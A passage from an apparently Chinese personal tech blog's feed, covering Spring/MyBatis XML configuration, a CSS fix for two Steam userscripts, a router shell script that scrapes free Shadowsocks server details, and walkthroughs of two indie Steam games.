class="comment">&lt;!-- 数据源 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 或者 com.mchange.v2.c3p0.ComboPooledDataSource 什么的--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClassName"</span> <span class="attr">value</span>=<span class="string">"com.mysql.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"jdbc:mysql://localhost:3306/test"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"root"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"toor"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- sqlSession(Factory) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sqlSessionFactory"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Mapper --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 手动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userMapper"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.mapper.MapperFactoryBean"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapperInterface"</span> <span class="attr">value</span>=<span class="string">"com.test.mapper.UserMapper"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sqlSessionFactory"</span> <span class="attr">ref</span>=<span class="string">"sqlSessionFactory"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 自动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"MapperScannerConfig"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.mapper.MapperScannerConfigurer"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"basePackage"</span> <span class="attr">value</span>=<span class="string">"com.test.mapper"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这样搞完后,只需要</p><ul><li>写好<em>DAO</em>层调数据库的接口,并写好操作数据库的sql语句(xml/注解),自动注入<em>Mapper</em>的配置</li><li>在<em>Service</em>层中配置<em>SqlSession</em>类型的变量,即可注入<em>sqlSession</em>,调用<em>DAO</em>层的接口</li><li>在<em>Controller</em>层调用<em>Service</em>层的方法,并使得<em>SpringMVC</em>可以传递输入输出数据</li><li>Tomcat等Servlet容器在启动之后将特定的数据传递到<em>SpringMVC</em></li><li>浏览器将其转换成从Tomcat或其他http服务器获得数据,展示给用户</li></ul><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>使用阿里巴巴的pagehelper即可,有中文文档</p><h2 id="一对多-多对一-多对多"><a href="#一对多-多对一-多对多" class="headerlink" title="一对多,多对一,多对多"></a>一对多,多对一,多对多</h2><p>在实体类中设置某其他实体类变量即可实现多对多的功能</p><h2 id="Mybatis-Generator"><a href="#Mybatis-Generator" class="headerlink" title="Mybatis Generator"></a>Mybatis Generator</h2><p><em>maven</em>中添加<em>mybatis-generator-maven-plugin(org.mybatis.generator)</em>插件</p><p>可自动生成mybatis所需的各种文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE generatorConfiguration PUBLIC</span></span><br><span class="line"><span class="meta">        "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"</span></span><br><span class="line"><span class="meta">        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd" &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">classPathEntry</span> <span class="attr">location</span>=<span class="string">"(jdbc驱动路径)"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">"context"</span> <span class="attr">targetRuntime</span>=<span class="string">"MyBatis3Simple"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suppressAllComments"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suppressDate"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- jdbc连接信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">userId</span>=<span class="string">""</span> <span class="attr">password</span>=<span class="string">""</span> <span class="attr">driverClass</span>=<span class="string">""</span> <span class="attr">connectionURL</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"forceBigDecimals"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Model构造器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">""</span> <span class="attr">targetProject</span>=<span class="string">"."</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"trimStrings"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- mapper.xml构造器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">""</span> <span class="attr">targetProject</span>=<span class="string">"."</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- mapper接口构造器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">targetPackage</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"XMLMAPPER"</span> <span class="attr">targetProject</span>=<span class="string">"."</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 指定表(table) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">schema</span>=<span class="string">""</span> <span class="attr">tableName</span>=<span class="string">""</span> <span class="attr">enableCountByExample</span>=<span class="string">"false"</span> <span class="attr">enableDeleteByExample</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableSelectByExample</span>=<span class="string">"false"</span> <span class="attr">enableUpdateByExample</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>官方文档 😂<br><a href="https://www.cnblogs.com/wuchanming/p/5426746.html" target="_blank" rel="noopener"></a></p><p><a href="http://blog.csdn.net/u010648555/article/details/76371474" target="_blank" rel="noopener"></a></p><p><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-spring-iocannt/" target="_blank" rel="noopener">详解 Spring 3.0 基于 Annotation 的依赖注入实现</a></p><p><a href="http://wiki.jikexueyuan.com/project/ssh-noob-learning/package.html" target="_blank" rel="noopener"></a></p><p><a href="wiki.jikexueyuan.com/project/spring/aop-with-spring.html">Spring 框架的 AOP - Spring 教程 - 极客学院 Wiki</a></p><p><a href="https://www.tianmaying.com/tutorial/spring-mvc-quickstart" target="_blank" rel="noopener"></a></p><p><a href="https://www.cnblogs.com/zhao307/p/5547986.html" target="_blank" rel="noopener">MyBatis xml 和 dao 层接口组合使用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;SSM&quot;&gt;&lt;a href=&quot;#SSM&quot; class=&quot;headerlink&quot; title=&quot;SSM:&quot;&gt;&lt;/a&gt;SSM:&lt;/h1&gt;&lt;p&gt;即是&lt;strong&gt;S&lt;/strong&gt;pring &lt;strong&gt;S&lt;/strong&gt;pringMVC &lt;strong&gt;M&lt;/strong&gt;ybatis的开头字母&lt;/p&gt;
&lt;h1 id=&quot;Spring&quot;&gt;&lt;a href=&quot;#Spring&quot; class=&quot;headerlink&quot; title=&quot;Spring&quot;&gt;&lt;/a&gt;Spring&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/htmlsingle/images/spring-overview.png&quot; alt=&quot;Spring Framework Runtime&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;S&lt;/strong&gt;SM里的Spring其实主要常用的是IoC和Aop,还有Test&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Spring默认的xml配置文件为 &lt;em&gt;applicationContext.xml&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Spring-IoC&quot;&gt;&lt;a href=&quot;#Spring-IoC&quot; class=&quot;headerlink&quot; title=&quot;Spring IoC&quot;&gt;&lt;/a&gt;Spring IoC&lt;/h2&gt;&lt;p&gt;中文译名:控制反转/依赖注入,简单来说,即是原来的&lt;code&gt;new xxx();&lt;/code&gt;用spring中content的bean代替,实现在构造函数的时候自动注入参数,有三种配置方式:基于xml,基于注解,基于java类,有三种注入方式:构造注入,set注入,工厂注入(不常用).&lt;br&gt;
    
    </summary>
    
    
      <category term="java" scheme="http://blog.qwerdf.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Steam Web Tools 与 Steam Economy Enhancer 共存</title>
    <link href="http://blog.qwerdf.com/2018/01/16/SteamWebToolsAndSteamEconomyEnhancerFix/"/>
    <id>http://blog.qwerdf.com/2018/01/16/SteamWebToolsAndSteamEconomyEnhancerFix/</id>
    <published>2018-01-16T06:04:46.000Z</published>
    <updated>2018-03-30T19:00:12.675Z</updated>
    
    <content type="html"><![CDATA[<p>steam常用脚本Steam Web Tools和Steam Economy Enhancer一起使用时,库存页面显示有冲突.此时仅需要将<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-class">.checkedForSend</span>&#123;<span class="attribute">background</span>:<span class="number">#366836</span><span class="meta">!important</span>&#125;<span class="selector-class">.itemcount</span>&#123;<span class="attribute">background</span>:<span class="number">#292929</span>;<span class="attribute">color</span>:<span class="number">#FFF</span>;<span class="attribute">font-weight</span>:<span class="number">700</span>;<span class="attribute">position</span>:absolute;<span class="attribute">right</span>:<span class="number">0</span>;<span class="attribute">top</span>:<span class="number">0</span>&#125;<span class="selector-class">.swt_icon</span>&#123;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:<span class="number">0</span>;<span class="attribute">left</span>:<span class="number">0</span>&#125;<span class="selector-class">.swt_icon-st</span>&#123;<span class="attribute">background</span>:<span class="number">#CF6A32</span>;<span class="attribute">color</span>:<span class="number">#fff</span>&#125;<span class="selector-class">.swt_icon-t</span>&#123;<span class="attribute">background</span>:<span class="number">#FDEC14</span>;<span class="attribute">color</span>:<span class="number">#000</span>&#125;<span class="selector-id">#inventory_logos</span>&#123;<span class="attribute">display</span>:none&#125;<span class="selector-class">.swt_hidden</span>&#123;<span class="attribute">display</span>:none&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>"</span><br></pre></td></tr></table></figure></p><p>修改为<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-class">.checkedForSend</span>&#123;<span class="attribute">background</span>:<span class="number">#366836</span><span class="meta">!important</span>&#125;<span class="selector-class">.itemcount</span>&#123;<span class="attribute">background</span>:<span class="number">#292929</span>;<span class="attribute">color</span>:<span class="number">#FFF</span>;<span class="attribute">font-weight</span>:<span class="number">700</span>;<span class="attribute">position</span>:absolute;<span class="attribute">right</span>:<span class="number">0</span>;<span class="attribute">bottom</span>:<span class="number">0</span>&#125;<span class="selector-class">.swt_icon</span>&#123;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:<span class="number">0</span>;<span class="attribute">left</span>:<span class="number">0</span>&#125;<span class="selector-class">.swt_icon-st</span>&#123;<span class="attribute">background</span>:<span class="number">#CF6A32</span>;<span class="attribute">color</span>:<span class="number">#fff</span>&#125;<span class="selector-class">.swt_icon-t</span>&#123;<span class="attribute">background</span>:<span class="number">#FDEC14</span>;<span class="attribute">color</span>:<span class="number">#000</span>&#125;<span class="selector-id">#inventory_logos</span>&#123;&#125;<span class="selector-class">.swt_hidden</span>&#123;<span class="attribute">display</span>:none&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>'</span><br></pre></td></tr></table></figure></p><p>即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;steam常用脚本Steam Web Tools和Steam Economy Enhancer一起使用时,库存页面显示有冲突.此时仅需要将&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
    
      <category term="javascript" scheme="http://blog.qwerdf.com/tags/javascript/"/>
    
      <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
    
  </entry>
  
  <entry>
    <title>基于sh的简单爬虫</title>
    <link href="http://blog.qwerdf.com/2017/07/20/simple-spider-with-bash/"/>
    <id>http://blog.qwerdf.com/2017/07/20/simple-spider-with-bash/</id>
    <published>2017-07-20T15:31:46.000Z</published>
    <updated>2018-03-30T18:59:16.470Z</updated>
    
    <content type="html"><![CDATA[<p>对于我这种买不起vps的穷逼来说,免费$$不失为一个很好的解决方案.然而大部分在飞机场里的免费$$都是隔一段时间变更一下端口和密码.</p><p>爬虫什么的用py做的比较多一点,然而在路由器上那点可怜的空间并不足以装上py.遂查了资料上了shell的爬虫.<br><a id="more"></a><br>多话不说.</p><pre><code>wget -t 1 -T 5 -q -O /tmp/auto_change_ss_xz https://xsjs.yhyhd.org/free-ss/select=`tr -cd 1-3 &lt;/dev/urandom | head -c 1`xhead=&apos;ss-body&apos;xend=&apos;modal-footer&apos;sed -i -e &quot;1,/$xhead/d&quot; -e &quot;/$xend/,$ d&quot; -e &apos;s/&amp;nbsp;/\n/g&apos; /tmp/auto_change_ss_xzss_server=$(cat /tmp/auto_change_ss_xz|sed &quot;$(($select*13-9))p&quot; -n|awk -F &apos;[&lt;&gt;]&apos; &apos;{print $3}&apos;)ss_server_port=$(cat /tmp/auto_change_ss_xz|sed &quot;$(($select*13-7))p&quot; -n|awk -F &apos;[&lt;&gt;]&apos; &apos;{print $3}&apos;)ss_method=$(cat /tmp/auto_change_ss_xz|sed &quot;$(($select*13-5))p&quot; -n|awk -F &apos;[&lt;&gt;]&apos; &apos;{print $3}&apos;)ss_key=$(cat /tmp/auto_change_ss_xz|sed &quot;$(($select*13-3))p&quot; -n|awk -F &apos;[&lt;&gt;]&apos; &apos;{print $3}&apos;)</code></pre><p>核心代码就是这么多,其中遇到的几个问题:</p><ol start="2"><li>sed/awk/grep就最后一个用过,前两个几乎没有用过,查了半天文档</li><li>路由器上的shell不支持 <code>&lt;&lt;&lt;</code>,最后用<code>$(...)</code>来代替了</li><li>wget默认重试和超时非常坑,在默认直接 <code>wget Url</code> 的情况下会默认重试 <code>900s*20次</code> .</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于我这种买不起vps的穷逼来说,免费$$不失为一个很好的解决方案.然而大部分在飞机场里的免费$$都是隔一段时间变更一下端口和密码.&lt;/p&gt;
&lt;p&gt;爬虫什么的用py做的比较多一点,然而在路由器上那点可怜的空间并不足以装上py.遂查了资料上了shell的爬虫.&lt;br&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
    
      <category term="shell" scheme="http://blog.qwerdf.com/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>Socxel | Pixel Soccer</title>
    <link href="http://blog.qwerdf.com/2017/07/19/Socxel-Pixel-Soccer/"/>
    <id>http://blog.qwerdf.com/2017/07/19/Socxel-Pixel-Soccer/</id>
    <published>2017-07-19T07:41:11.000Z</published>
    <updated>2018-03-30T19:00:26.852Z</updated>
    
    <content type="html"><![CDATA[<p>今天随机到的游戏是Socxel | Pixel Soccer</p><p><iframe src="https://store.steampowered.com/widget/586190/" style="border:none;height:190px;width:100%;max-width:646px;"></iframe><br>开发商是 BUG-Studio 😄 这名字好啊.<br><a id="more"></a></p><h2 id="0x01-简单游玩"><a href="#0x01-简单游玩" class="headerlink" title="0x01 简单游玩"></a>0x01 简单游玩</h2><p>游戏支持最大4人同时在一台电脑上游戏.</p><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958712904374506/CDFF35FB840FE8005A79B9033A4064DBA3660AB0/?pic1.jpg" alt="进入游戏" title="进入游戏"></p><p>下面可以更改操控键位设置,并不是常见的wasd控制方向什么的,而是…</p><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958712904376477/21F5B11383251C1780C429311A7057A4EE1E2DF3/?pic2.jpg" alt="啥都不做都赢了" title="啥都不做居然还能赢了"></p><p>btw,开了吧<code>1 vs AI</code>,摸索了半天都不知道用什么操控.然而我居然赢了…电脑经常把球踢进自己球门.所以这破游戏啥都不动只要是欧皇,对电脑怎么都赢了.</p><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958712904378919/8B1A1F937B7690D771B009D8417FD8887E57943A/?pic3.jpg" alt="按键" title="按键提示"></p><p>这游戏丧心病狂的只用一个按键(图中有提示)来操作,如果你不按任何按键的话,游戏内的任务会在原地转圈;而当你按下游戏一开始提示的按键的话,游戏中的人物将向前冲,并改变转向.</p><h2 id="0x02-意外发现"><a href="#0x02-意外发现" class="headerlink" title="0x02 意外发现"></a>0x02 意外发现</h2><p>在游戏中准备用f12截图,却意外的发现打开了<code>Devtools</code> ,难道这游戏直接是用HTML5开发的嘛?</p><p>带着疑问大概看了下代码,发现了个关键字<code>c2canvasdiv</code> ,Google了下发现是一个游戏引擎 <a href="https://www.scirra.com" target="_blank" rel="noopener">Construct 2</a> . </p><p><code>Construct</code>是一个HTML5的游戏引擎,类似于<code>GameMaker</code>,但是相比感觉前者更强大一些.类似的我只知道unity3d可以导出为web格式,但是前两者拥有所见即所得的简单编辑模式,只需要动动手拖动一下就可以很轻易的制作一些简单的游戏.简单易用的程度也表现在,我甚至在网上找到了面向14岁+开展的培训班.</p><p>顺便一提,<a href="http://store.steampowered.com/app/227240/" target="_blank" rel="noopener">Construct 2</a>居然也在steam商店上架了.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天随机到的游戏是Socxel | Pixel Soccer&lt;/p&gt;
&lt;p&gt;&lt;iframe src=&quot;https://store.steampowered.com/widget/586190/&quot; style=&quot;border:none;height:190px;width:100%;max-width:646px;&quot;&gt;&lt;/iframe&gt;&lt;br&gt;开发商是 BUG-Studio 😄 这名字好啊.&lt;br&gt;
    
    </summary>
    
    
      <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
    
      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
    
  </entry>
  
  <entry>
    <title>The Next Door</title>
    <link href="http://blog.qwerdf.com/2017/07/17/The-Next-Door/"/>
    <id>http://blog.qwerdf.com/2017/07/17/The-Next-Door/</id>
    <published>2017-07-16T17:35:48.000Z</published>
    <updated>2018-03-30T19:00:43.902Z</updated>
    
    <content type="html"><![CDATA[<p>今天随机到的游戏是”The Next Door”.</p><p><iframe src="https://store.steampowered.com/widget/447850/" style="border:none;height:190px;width:100%;max-width:646px;"></iframe><br>不不不,不是你想的那个意♂思,和”Boy♂Next♂Door”的那个一点关系都没有.此游戏是一个融合了宗教元素的正常向解密游戏,只是我第一次玩的时候直白的xx画面吓得我赶紧把游戏关掉了而已.<br><a id="more"></a></p><blockquote><p>tips:按住shift打开游戏可以调整画面设置.</p></blockquote><h2 id="0x00-before"><a href="#0x00-before" class="headerlink" title="0x00 before:"></a>0x00 before:</h2><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716407373/0694D75E531745E578EDC5DD65AA42A4B2239F50/?pic0,jpg" alt="pic0"><br>开局点门</p><blockquote><p>-What is your greatest wish?<br>-啥是你最大的愿望?<br>-my desire is to be extraordinary<br>-我的愿望是成为伟大的人<br>-how will you do that?<br>-你会怎么做?<br>-go up<br>-向上</p></blockquote><p>画面一转,一个门在一个看似女士的背景上的不可描述的部位,玩家与门互动后画风一变:变成了小蝌蚪找球球.<br><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716400857/8689F802B18B8FDD6BC99CBBAE3A4E29553BE5B0/?pic1.jpg" alt="test"><br>此处球球指代月球.</p><h2 id="0x01-Ladyrinth"><a href="#0x01-Ladyrinth" class="headerlink" title="0x01 Ladyrinth"></a>0x01 Ladyrinth</h2><p>到了一个房子</p><p>书架上有纸条,桌面上有一个手机,左手边有个电视.头顶有数字盘,房间拐角大大的”E”</p><p>按E后脚下变成了R,周围的物品一下就变了.</p><p>后来看到脚下有数字盘发现是到了天花板上</p><p>数字盘可以拨动,为手机内的数字.正确后窗户外面会出现一个长长的独木桥.</p><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716401664/A40E72D614D3611C7A69B127E2A8829251138787/?pic2.jpg" alt="pic2"></p><p>出窗后有条路,走上去有汽车声.</p><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716401950/4CD77568503B0565F101773347CB43CED4ECE6C4/?pic3.jpg" alt="pic3"></p><p>回头发现房子上方有和纸条一样的图形,即:<strong>卡巴拉</strong>生命之树</p><p>走到桥的尽头,根据地面提示按”Q”后,进入下一个部分,即是走迷宫…用贴边大法完全没有难度…</p><h2 id="0x02-the-equilibrium"><a href="#0x02-the-equilibrium" class="headerlink" title="0x02 the equilibrium"></a>0x02 the equilibrium</h2><blockquote><p>hello i am your limits. keep your sanity.<br>你好,我是你的极限(?),请保持清醒.</p></blockquote><blockquote><p>keep your sanity .no trespassing<br>保持清醒!这里没有非法入侵(?).</p></blockquote><blockquote><p>this is a revolution of the mind<br>这是一场心灵的革命!</p></blockquote><p>沿着路线转了两个弯后发现:WTF,这不是 <a href="http://store.steampowered.com/app/221910/" target="_blank" rel="noopener">史丹利的预言</a> 的场景嘛…</p><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716402703/1BADDB35A2583A84CB772008C2D3F5DACFD70957/?pic4.jpg" alt="pic4"></p><p>经过一段崎岖的路后发现了下一个需要解密的地方,需要将上方与下方的对应即可.</p><h2 id="0x03-the-box"><a href="#0x03-the-box" class="headerlink" title="0x03 the box"></a>0x03 the box</h2><p>开局在一个房间里,墙上有画,有表,有摄像头.地面上有电视,显示的是摄像头里的画面.<br>此关即与电视互动,开门即可</p><h2 id="0x04-out-of-the-box"><a href="#0x04-out-of-the-box" class="headerlink" title="0x04 out of the box"></a>0x04 out of the box</h2><p>此关即与电视互动,一路爬楼梯,开门即可.</p><h2 id="0x05-illuminated"><a href="#0x05-illuminated" class="headerlink" title="0x05 illuminated"></a>0x05 illuminated</h2><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716403567/3957747B2C362092D1F820655CB06E4F23D3DE70/?pic5.jpg" alt="pic5"><br>照图选择即可,此处的图案与塔罗牌有关,而塔罗牌也与<strong>卡巴拉</strong>有关.</p><p>跳入大洞后前方既是开头的”月亮”.</p><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716438486/55AF5C6A80344042E389AB8714E7F077EE62AFC4/?pic6.jpg" alt="pic6"></p><blockquote><p>the true name of God<br>GOWD</p></blockquote><p>赶紧去查了下…</p><blockquote><p>耶和華（英语：Jehovah，又作Yehovah 或 Yehowah），對希伯來聖經中的希伯來語：יְהֹוָה‎‎，或是四字神名（希伯來語：יהוה‎‎，YHWH）加上母音，進行拉丁化而产生的一个专有名词。原是猶太教尊奉的神名，也是基督教中的神，天主教譯作雅威。–Wikipedia</p></blockquote><h2 id="0x06-collective-unconscious"><a href="#0x06-collective-unconscious" class="headerlink" title="0x06 collective unconscious"></a>0x06 collective unconscious</h2><p>抬头见卫星 回头见人头<br><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716406822/2FE09E5A9402DF318F143467B769F56155BFE746/?pic7.jpg" alt="pic7"><br>人头背面四个标志,下面四个选项可由<em>The box</em>关墙上的画可知,分别对应Fire/Earth/Wind/Water(即四元素)<br><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716407218/D1C3BB739B180812914F83B8D49EBBB96C75518A/?pic8.jpg" alt="pic8"><br>至此即通关,开门后可见游戏设计的原画于一大堆不同语言的评论,大多数是英文.</p><p>–</p><h2 id="0x07-Final"><a href="#0x07-Final" class="headerlink" title="0x07 Final"></a>0x07 Final</h2><p>最后与电视互动,提示”You sure want to look inside?”</p><p>选yes后,伴随着刺耳的声音,依次出现人脸,四面体,十字架和门外的外星人,意义不明.</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>这个游戏总的来说有一种不明觉厉的感觉,解密元素不多,满打满算也就六个,其中至少一半与”<strong>卡巴拉</strong>(Kabbalah)”有关.</p><p><strong>卡巴拉</strong>是一种哲学思想,起源于犹太人,后来影响了多种教派,包括基督教.但是它本身却并没有独立成为宗教.简单来说<strong>卡巴拉</strong>即解释有限的宇宙与无限的造物主之间的关系.<br><img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Tree_of_life_bahir_hebrew.png" 